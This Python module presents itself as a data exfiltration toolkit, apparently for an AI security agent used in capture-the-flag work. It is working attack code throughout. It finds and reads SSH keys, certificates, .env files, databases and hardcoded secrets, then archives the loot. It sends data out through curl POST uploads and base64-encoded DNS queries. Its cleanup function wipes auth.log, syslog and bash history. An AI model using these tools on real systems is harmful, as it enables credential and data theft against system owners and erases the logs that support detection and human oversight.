"""
Data Exfiltration Toolkit for CAI

This module provides comprehensive data exfiltration tools including
file collection, encryption, stealth transfer methods, and evidence cleanup.
"""

import os
import re
import time
import json
import base64
import hashlib
import zipfile
import tarfile
import subprocess
from typing import Dict, List, Tuple, Optional, Any
from cai.tools.common import run_command


def automated_data_collection(target_directory: str = "/", ctf=None, **kwargs) -> str:
    """
    Perform automated sensitive data collection
    
    Args:
        target_directory: Root directory to search for sensitive data
        
    Returns:
        str: Detailed results of data collection operation
    """
    results = []
    results.append("=== Automated Data Collection ===")
    results.append(f"Target Directory: {target_directory}")
    results.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("")

    try:
        # 1. Credential File Discovery
        results.append("=== Credential File Discovery ===")
        cred_files = discover_credential_files(target_directory, ctf=ctf)
        results.append(cred_files)
        results.append("")

        # 2. Database File Discovery
        results.append("=== Database File Discovery ===")
        db_files = discover_database_files(target_directory, ctf=ctf)
        results.append(db_files)
        results.append("")

        # 3. Configuration File Analysis
        results.append("=== Configuration File Analysis ===")
        config_analysis = analyze_configuration_files(target_directory, ctf=ctf)
        results.append(config_analysis)
        results.append("")

        # 4. Document Collection
        results.append("=== Document Collection ===")
        document_collection = collect_documents(target_directory, ctf=ctf)
        results.append(document_collection)
        results.append("")

        # 5. Source Code Analysis
        results.append("=== Source Code Analysis ===")
        source_analysis = analyze_source_code(target_directory, ctf=ctf)
        results.append(source_analysis)
        results.append("")

        # 6. System Information Gathering
        results.append("=== System Information Gathering ===")
        system_info = gather_system_information(ctf=ctf)
        results.append(system_info)
        results.append("")

        return "\n".join(results)

    except Exception as e:
        return f"Error during automated data collection: {str(e)}"


def discover_credential_files(target_directory: str, ctf=None, **kwargs) -> str:
    """Discover files containing credentials and sensitive authentication data"""
    results = []

    try:
        # Credential file patterns
        credential_patterns = [
            "*.pem", "*.key", "*.crt", "*.p12", "*.pfx",
            "*password*", "*passwd*", "*credential*", "*secret*",
            "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
            ".htpasswd", ".netrc", ".pgpass", "credentials.json"
        ]

        results.append("Searching for credential files:")
        found_files = []

        for pattern in credential_patterns:
            search_cmd = f"find {target_directory} -name '{pattern}' -type f 2>/dev/null"
            search_result = run_command(search_cmd, ctf=ctf)

            if search_result.strip():
                files = search_result.strip().split('\n')
                for file_path in files:
                    if file_path.strip():
                        found_files.append(file_path.strip())
                        results.append(f"🔑 Found: {file_path.strip()}")

        # Search for SSH keys specifically
        ssh_key_search = run_command(f"find {target_directory} -name 'id_*' -o -name '*.pub' 2>/dev/null", ctf=ctf)
        if ssh_key_search.strip():
            results.append(f"\n🔑 SSH Keys found:")
            for key_file in ssh_key_search.strip().split('\n'):
                if key_file.strip():
                    results.append(f"  - {key_file.strip()}")
                    found_files.append(key_file.strip())

        # Search in common credential directories
        credential_dirs = [
            "/home/*/.ssh",
            "/root/.ssh",
            "/etc/ssl/private",
            "/var/lib/mysql",
            "/etc/pki"
        ]

        for cred_dir in credential_dirs:
            dir_search = run_command(f"find {cred_dir} -type f 2>/dev/null | head -10", ctf=ctf)
            if dir_search.strip():
                results.append(f"\nCredential files in {cred_dir}:")
                for file_path in dir_search.strip().split('\n'):
                    if file_path.strip():
                        results.append(f"  - {file_path.strip()}")
                        found_files.append(file_path.strip())

        # Check file contents for embedded credentials
        results.append(f"\nAnalyzing files for embedded credentials:")
        for file_path in found_files[:5]:  # Check first 5 files
            if os.path.isfile(file_path):
                file_analysis = analyze_file_for_credentials(file_path, ctf=ctf)
                if file_analysis.strip():
                    results.append(f"\n📄 Analysis of {file_path}:")
                    results.append(file_analysis)

        results.append(f"\nTotal credential files discovered: {len(found_files)}")

    except Exception as e:
        results.append(f"Error discovering credential files: {str(e)}")

    return "\n".join(results)


def discover_database_files(target_directory: str, ctf=None, **kwargs) -> str:
    """Discover database files and connection strings"""
    results = []

    try:
        # Database file extensions
        db_extensions = [
            "*.db", "*.sqlite", "*.sqlite3", "*.mdb", "*.accdb",
            "*.dbf", "*.sql", "*.dump", "*.bak"
        ]

        results.append("Searching for database files:")
        found_databases = []

        for extension in db_extensions:
            search_cmd = f"find {target_directory} -name '{extension}' -type f 2>/dev/null"
            search_result = run_command(search_cmd, ctf=ctf)

            if search_result.strip():
                for db_file in search_result.strip().split('\n'):
                    if db_file.strip():
                        found_databases.append(db_file.strip())
                        file_size = run_command(f"ls -lh '{db_file.strip()}' | awk '{{print $5}}'", ctf=ctf)
                        results.append(f"💾 Database: {db_file.strip()} ({file_size.strip()})")

        # Look for database configuration files
        config_patterns = [
            "*database*", "*db_config*", "*connection*",
            "*.conf", "*.ini", "*.cfg", "*.properties"
        ]

        results.append(f"\nSearching for database configuration files:")
        for pattern in config_patterns:
            config_search = run_command(f"find {target_directory} -name '{pattern}' -type f 2>/dev/null", ctf=ctf)
            if config_search.strip():
                for config_file in config_search.strip().split('\n')[:5]:  # First 5 files
                    if config_file.strip():
                        # Look for database connection strings
                        db_strings = run_command(
                            f"grep -i -E '(database|mysql|postgres|mongodb|oracle)' '{config_file.strip()}' 2>/dev/null",
                            ctf=ctf)
                        if db_strings.strip():
                            results.append(f"🔧 Config: {config_file.strip()}")
                            results.append(f"   Connection info: {db_strings.strip()[:100]}...")

        # Search for MySQL, PostgreSQL, MongoDB data directories
        db_data_dirs = [
            "/var/lib/mysql",
            "/var/lib/postgresql",
            "/var/lib/mongodb",
            "/opt/mssql/data"
        ]

        for data_dir in db_data_dirs:
            if run_command(f"test -d {data_dir} && echo 'exists'", ctf=ctf).strip() == "exists":
                results.append(f"\n📁 Database data directory found: {data_dir}")
                dir_contents = run_command(f"ls -la {data_dir} 2>/dev/null | head -10", ctf=ctf)
                if dir_contents.strip():
                    results.append(f"   Contents: {dir_contents}")

        results.append(f"\nTotal database files discovered: {len(found_databases)}")

    except Exception as e:
        results.append(f"Error discovering database files: {str(e)}")

    return "\n".join(results)


def analyze_configuration_files(target_directory: str, ctf=None, **kwargs) -> str:
    """Analyze configuration files for sensitive information"""
    results = []

    try:
        # Common configuration file patterns
        config_patterns = [
            "*.conf", "*.cfg", "*.ini", "*.properties", "*.yaml", "*.yml",
            "*.json", "*.xml", "config.php", "settings.py", ".env"
        ]

        results.append("Analyzing configuration files:")
        sensitive_configs = []

        for pattern in config_patterns:
            search_cmd = f"find {target_directory} -name '{pattern}' -type f 2>/dev/null"
            search_result = run_command(search_cmd, ctf=ctf)

            if search_result.strip():
                for config_file in search_result.strip().split('\n')[:10]:  # First 10 files
                    if config_file.strip():
                        # Search for sensitive information patterns
                        sensitive_patterns = [
                            "password", "passwd", "secret", "key", "token",
                            "api_key", "private_key", "database", "connection"
                        ]

                        for pattern_search in sensitive_patterns:
                            sensitive_data = run_command(
                                f"grep -i '{pattern_search}' '{config_file.strip()}' 2>/dev/null", ctf=ctf)
                            if sensitive_data.strip():
                                if config_file not in sensitive_configs:
                                    sensitive_configs.append(config_file.strip())
                                    results.append(f"🔧 Sensitive config: {config_file.strip()}")

                                # Show first few matches
                                for line in sensitive_data.strip().split('\n')[:3]:
                                    if line.strip():
                                        results.append(f"   {line.strip()}")
                                break

        # Check for environment files
        env_files = run_command(f"find {target_directory} -name '.env*' -o -name 'environment*' 2>/dev/null", ctf=ctf)
        if env_files.strip():
            results.append(f"\n🌍 Environment files found:")
            for env_file in env_files.strip().split('\n'):
                if env_file.strip():
                    results.append(f"  - {env_file.strip()}")
                    # Show contents (first few lines)
                    env_contents = run_command(f"head -5 '{env_file.strip()}' 2>/dev/null", ctf=ctf)
                    if env_contents.strip():
                        results.append(f"    Contents: {env_contents.strip()}")

        results.append(f"\nTotal sensitive configuration files: {len(sensitive_configs)}")

    except Exception as e:
        results.append(f"Error analyzing configuration files: {str(e)}")

    return "\n".join(results)


def collect_documents(target_directory: str, ctf=None, **kwargs) -> str:
    """Collect potentially sensitive documents"""
    results = []

    try:
        # Document file extensions
        document_extensions = [
            "*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx",
            "*.txt", "*.csv", "*.rtf", "*.odt", "*.ods", "*.odp"
        ]

        results.append("Collecting documents:")
        found_documents = []

        for extension in document_extensions:
            search_cmd = f"find {target_directory} -name '{extension}' -type f 2>/dev/null"
            search_result = run_command(search_cmd, ctf=ctf)

            if search_result.strip():
                for doc_file in search_result.strip().split('\n')[:15]:  # First 15 files
                    if doc_file.strip():
                        found_documents.append(doc_file.strip())
                        file_info = run_command(f"ls -lh '{doc_file.strip()}' | awk '{{print $5, $6, $7, $8}}'",
                                                ctf=ctf)
                        results.append(f"📄 Document: {doc_file.strip()} ({file_info.strip()})")

        # Look for files with sensitive keywords in names
        sensitive_keywords = [
            "*confidential*", "*secret*", "*private*", "*password*",
            "*credentials*", "*backup*", "*dump*", "*export*"
        ]

        results.append(f"\nSearching for files with sensitive keywords:")
        for keyword in sensitive_keywords:
            keyword_search = run_command(f"find {target_directory} -iname '{keyword}' -type f 2>/dev/null", ctf=ctf)
            if keyword_search.strip():
                for sensitive_file in keyword_search.strip().split('\n')[:5]:
                    if sensitive_file.strip():
                        results.append(f"🔍 Sensitive: {sensitive_file.strip()}")

        # Search for recently modified files (potential data dumps)
        recent_files = run_command(f"find {target_directory} -type f -mtime -7 -size +1M 2>/dev/null | head -10",
                                   ctf=ctf)
        if recent_files.strip():
            results.append(f"\nRecently modified large files (last 7 days):")
            for recent_file in recent_files.strip().split('\n'):
                if recent_file.strip():
                    file_info = run_command(f"ls -lh '{recent_file.strip()}' | awk '{{print $5, $6, $7, $8}}'", ctf=ctf)
                    results.append(f"📅 Recent: {recent_file.strip()} ({file_info.strip()})")

        results.append(f"\nTotal documents found: {len(found_documents)}")

    except Exception as e:
        results.append(f"Error collecting documents: {str(e)}")

    return "\n".join(results)


def analyze_source_code(target_directory: str, ctf=None, **kwargs) -> str:
    """Analyze source code for hardcoded secrets and sensitive information"""
    results = []

    try:
        # Source code file extensions
        source_extensions = [
            "*.py", "*.php", "*.js", "*.java", "*.cpp", "*.c", "*.h",
            "*.rb", "*.go", "*.rs", "*.sh", "*.bat", "*.ps1"
        ]

        results.append("Analyzing source code for secrets:")

        # Patterns that indicate hardcoded secrets
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']{3,}["\']',
            r'api[_-]?key\s*=\s*["\'][^"\']{10,}["\']',
            r'secret\s*=\s*["\'][^"\']{8,}["\']',
            r'token\s*=\s*["\'][^"\']{10,}["\']',
            r'private[_-]?key\s*=\s*["\'][^"\']{20,}["\']'
        ]

        found_secrets = []

        for extension in source_extensions:
            search_cmd = f"find {target_directory} -name '{extension}' -type f 2>/dev/null"
            search_result = run_command(search_cmd, ctf=ctf)

            if search_result.strip():
                for source_file in search_result.strip().split('\n')[:10]:  # First 10 files
                    if source_file.strip():
                        # Search for hardcoded secrets
                        for pattern in secret_patterns:
                            secret_search = run_command(f"grep -E '{pattern}' '{source_file.strip()}' 2>/dev/null",
                                                        ctf=ctf)
                            if secret_search.strip():
                                found_secrets.append(source_file.strip())
                                results.append(f"🔐 Hardcoded secret in: {source_file.strip()}")
                                for line in secret_search.strip().split('\n')[:2]:
                                    if line.strip():
                                        results.append(f"   {line.strip()}")
                                break

        # Look for database connection strings in source code
        db_patterns = [
            r'mysql:\/\/[^"\']+',
            r'postgresql:\/\/[^"\']+',
            r'mongodb:\/\/[^"\']+',
            r'redis:\/\/[^"\']+',
            r'sqlite:\/\/[^"\']+'
        ]

        results.append(f"\nSearching for database connection strings:")
        for extension in source_extensions[:5]:  # Check first 5 extensions
            search_cmd = f"find {target_directory} -name '{extension}' -type f 2>/dev/null"
            source_files = run_command(search_cmd, ctf=ctf)

            if source_files.strip():
                for source_file in source_files.strip().split('\n')[:5]:
                    if source_file.strip():
                        for db_pattern in db_patterns:
                            db_connection = run_command(f"grep -E '{db_pattern}' '{source_file.strip()}' 2>/dev/null",
                                                        ctf=ctf)
                            if db_connection.strip():
                                results.append(f"🗄️ DB connection in: {source_file.strip()}")
                                results.append(f"   {db_connection.strip()}")
                                break

        # Look for comments containing TODO, FIXME, HACK with sensitive info
        comment_patterns = [
            r'#.*(?:TODO|FIXME|HACK).*(?:password|secret|key)',
            r'//.*(?:TODO|FIXME|HACK).*(?:password|secret|key)',
            r'/\*.*(?:TODO|FIXME|HACK).*(?:password|secret|key).*\*/'
        ]

        results.append(f"\nSearching for sensitive comments:")
        for extension in source_extensions[:3]:  # Check first 3 extensions
            search_cmd = f"find {target_directory} -name '{extension}' -type f 2>/dev/null"
            source_files = run_command(search_cmd, ctf=ctf)

            if source_files.strip():
                for source_file in source_files.strip().split('\n')[:5]:
                    if source_file.strip():
                        for comment_pattern in comment_patterns:
                            sensitive_comments = run_command(
                                f"grep -iE '{comment_pattern}' '{source_file.strip()}' 2>/dev/null", ctf=ctf)
                            if sensitive_comments.strip():
                                results.append(f"💬 Sensitive comment in: {source_file.strip()}")
                                results.append(f"   {sensitive_comments.strip()}")
                                break

        results.append(f"\nSource files with secrets: {len(found_secrets)}")

    except Exception as e:
        results.append(f"Error analyzing source code: {str(e)}")

    return "\n".join(results)


def gather_system_information(ctf=None, **kwargs) -> str:
    """Gather comprehensive system information"""
    results = []

    try:
        results.append("Gathering system information:")

        # Basic system info
        system_info = [
            ("Hostname", "hostname"),
            ("OS Info", "cat /etc/os-release 2>/dev/null | head -5"),
            ("Kernel", "uname -a"),
            ("Uptime", "uptime"),
            ("Current User", "whoami"),
            ("User ID", "id"),
            ("Environment", "env | head -10")
        ]

        for info_name, command in system_info:
            info_result = run_command(command, ctf=ctf)
            if info_result.strip():
                results.append(f"\n{info_name}:")
                results.append(info_result)

        # Network configuration
        network_commands = [
            ("Network Interfaces", "ip addr show"),
            ("Routing Table", "ip route"),
            ("DNS Configuration", "cat /etc/resolv.conf"),
            ("Listening Services", "netstat -tlnp 2>/dev/null | head -10")
        ]

        for net_name, command in network_commands:
            net_result = run_command(command, ctf=ctf)
            if net_result.strip():
                results.append(f"\n{net_name}:")
                results.append(net_result)

        # Installed software
        software_info = run_command("dpkg -l 2>/dev/null | head -20 || rpm -qa 2>/dev/null | head -20", ctf=ctf)
        if software_info.strip():
            results.append(f"\nInstalled Software (sample):")
            results.append(software_info)

        # Running processes
        processes = run_command("ps aux | head -15", ctf=ctf)
        if processes.strip():
            results.append(f"\nRunning Processes (sample):")
            results.append(processes)

        # Cron jobs
        cron_jobs = run_command("crontab -l 2>/dev/null", ctf=ctf)
        if cron_jobs.strip() and "no crontab" not in cron_jobs.lower():
            results.append(f"\nUser Cron Jobs:")
            results.append(cron_jobs)

    except Exception as e:
        results.append(f"Error gathering system information: {str(e)}")

    return "\n".join(results)


def analyze_file_for_credentials(file_path: str, ctf=None, **kwargs) -> str:
    """Analyze a specific file for embedded credentials"""
    results = []

    try:
        # Check file type
        file_type = run_command(f"file '{file_path}'", ctf=ctf)
        results.append(f"File type: {file_type.strip()}")

        # For text files, look for credential patterns
        if "text" in file_type.lower() or "ASCII" in file_type:
            # Search for common credential patterns
            patterns = [
                r'password\s*[:=]\s*\S+',
                r'passwd\s*[:=]\s*\S+',
                r'secret\s*[:=]\s*\S+',
                r'key\s*[:=]\s*\S+',
                r'token\s*[:=]\s*\S+',
                r'api[_-]?key\s*[:=]\s*\S+'
            ]

            for pattern in patterns:
                pattern_matches = run_command(f"grep -iE '{pattern}' '{file_path}' 2>/dev/null | head -3", ctf=ctf)
                if pattern_matches.strip():
                    results.append(f"Credentials found:")
                    results.append(pattern_matches)
                    break

        # For SSH keys, show key type and fingerprint
        elif "private key" in file_type.lower() or "OpenSSH" in file_type:
            key_info = run_command(f"ssh-keygen -l -f '{file_path}' 2>/dev/null", ctf=ctf)
            if key_info.strip():
                results.append(f"SSH key fingerprint: {key_info.strip()}")

        # File permissions
        permissions = run_command(f"ls -la '{file_path}'", ctf=ctf)
        if permissions.strip():
            results.append(f"Permissions: {permissions.strip()}")

    except Exception as e:
        results.append(f"Error analyzing file: {str(e)}")

    return "\n".join(results)


def create_data_archive(source_paths: List[str], archive_name: str = "collected_data", ctf=None, **kwargs) -> str:
    """Create encrypted archive of collected data"""
    results = []

    try:
        archive_path = f"/tmp/{archive_name}_{int(time.time())}.tar.gz"
        results.append(f"Creating data archive: {archive_path}")

        # Create tar archive
        if source_paths:
            paths_str = " ".join([f"'{path}'" for path in source_paths if path.strip()])
            tar_cmd = f"tar -czf '{archive_path}' {paths_str} 2>/dev/null"
            tar_result = run_command(tar_cmd, ctf=ctf)

            # Check if archive was created
            if run_command(f"test -f '{archive_path}' && echo 'exists'", ctf=ctf).strip() == "exists":
                archive_size = run_command(f"ls -lh '{archive_path}' | awk '{{print $5}}'", ctf=ctf)
                results.append(f"✓ Archive created successfully ({archive_size.strip()})")

                # Calculate hash
                archive_hash = run_command(f"sha256sum '{archive_path}' | awk '{{print $1}}'", ctf=ctf)
                if archive_hash.strip():
                    results.append(f"Archive SHA256: {archive_hash.strip()}")
            else:
                results.append("⚠ Failed to create archive")
        else:
            results.append("No source paths provided")

        # Encrypt archive (if gpg is available)
        gpg_available = run_command("which gpg 2>/dev/null", ctf=ctf)
        if gpg_available.strip() and run_command(f"test -f '{archive_path}' && echo 'exists'",
                                                 ctf=ctf).strip() == "exists":
            encrypted_path = f"{archive_path}.gpg"
            # Use symmetric encryption with passphrase
            passphrase = "cybersec2024"  # In real scenarios, use strong random passphrase
            encrypt_cmd = f"echo '{passphrase}' | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 --output '{encrypted_path}' '{archive_path}'"
            encrypt_result = run_command(encrypt_cmd, ctf=ctf)

            if run_command(f"test -f '{encrypted_path}' && echo 'exists'", ctf=ctf).strip() == "exists":
                results.append(f"✓ Archive encrypted: {encrypted_path}")
                results.append(f"Passphrase: {passphrase}")
                # Remove unencrypted archive
                run_command(f"rm -f '{archive_path}'", ctf=ctf)
                archive_path = encrypted_path

        results.append(f"\nFinal archive location: {archive_path}")

    except Exception as e:
        results.append(f"Error creating data archive: {str(e)}")

    return "\n".join(results)


def exfiltrate_via_http(file_path: str, target_url: str, ctf=None, **kwargs) -> str:
    """Exfiltrate data via HTTP POST"""
    results = []

    try:
        results.append(f"Exfiltrating {file_path} via HTTP to {target_url}")

        # Check if file exists
        if run_command(f"test -f '{file_path}' && echo 'exists'", ctf=ctf).strip() != "exists":
            return f"File {file_path} does not exist"

        # Get file size
        file_size = run_command(f"ls -lh '{file_path}' | awk '{{print $5}}'", ctf=ctf)
        results.append(f"File size: {file_size.strip()}")

        # Upload file via curl
        upload_cmd = f"curl -X POST -F 'file=@{file_path}' '{target_url}' -m 60"
        upload_result = run_command(upload_cmd, ctf=ctf)

        if upload_result.strip():
            results.append(f"Upload response: {upload_result.strip()}")
            results.append("✓ File uploaded successfully")
        else:
            results.append("⚠ Upload may have failed (no response)")

    except Exception as e:
        results.append(f"Error during HTTP exfiltration: {str(e)}")

    return "\n".join(results)


def exfiltrate_via_dns(data: str, dns_server: str, ctf=None, **kwargs) -> str:
    """Exfiltrate small amounts of data via DNS queries"""
    results = []

    try:
        results.append(f"Exfiltrating data via DNS to {dns_server}")

        # Encode data as base64 for DNS transmission
        encoded_data = base64.b64encode(data.encode()).decode()
        results.append(f"Encoded data length: {len(encoded_data)} characters")

        # Split data into chunks (DNS labels have 63 char limit)
        chunk_size = 50
        chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]

        results.append(f"Data split into {len(chunks)} chunks")

        # Send each chunk as DNS query
        for i, chunk in enumerate(chunks):
            dns_query = f"{chunk}.exfil.{dns_server}"
            dns_cmd = f"nslookup {dns_query} 2>/dev/null"
            dns_result = run_command(dns_cmd, ctf=ctf)

            if "NXDOMAIN" in dns_result or "not found" in dns_result.lower():
                results.append(f"✓ Chunk {i + 1} sent via DNS")
            else:
                results.append(f"⚠ Chunk {i + 1} may have failed")

        results.append("DNS exfiltration completed")

    except Exception as e:
        results.append(f"Error during DNS exfiltration: {str(e)}")

    return "\n".join(results)


def cleanup_evidence(file_paths: List[str], ctf=None, **kwargs) -> str:
    """Clean up evidence of data collection activities"""
    results = []

    try:
        results.append("Cleaning up evidence of data collection:")

        # Secure delete files
        for file_path in file_paths:
            if run_command(f"test -f '{file_path}' && echo 'exists'", ctf=ctf).strip() == "exists":
                # Overwrite file with random data before deletion
                overwrite_cmd = f"dd if=/dev/urandom of='{file_path}' bs=1024 count=10 2>/dev/null"
                run_command(overwrite_cmd, ctf=ctf)

                # Remove file
                rm_result = run_command(f"rm -f '{file_path}'", ctf=ctf)
                results.append(f"✓ Securely deleted: {file_path}")

        # Clear bash history
        history_clear = run_command("history -c && history -w", ctf=ctf)
        results.append("✓ Cleared bash history")

        # Clear system logs (if possible)
        log_clear_commands = [
            "echo '' > /var/log/auth.log 2>/dev/null",
            "echo '' > /var/log/syslog 2>/dev/null",
            "echo '' > /var/log/messages 2>/dev/null",
            "echo '' > ~/.bash_history 2>/dev/null"
        ]

        for log_cmd in log_clear_commands:
            run_command(log_cmd, ctf=ctf)

        results.append("✓ Attempted to clear system logs")

        # Clear temporary files
        temp_cleanup = run_command("rm -rf /tmp/collected_* /tmp/exfil_* 2>/dev/null", ctf=ctf)
        results.append("✓ Cleared temporary files")

        results.append("Evidence cleanup completed")

    except Exception as e:
        results.append(f"Error during evidence cleanup: {str(e)}")

    return "\n".join(results)
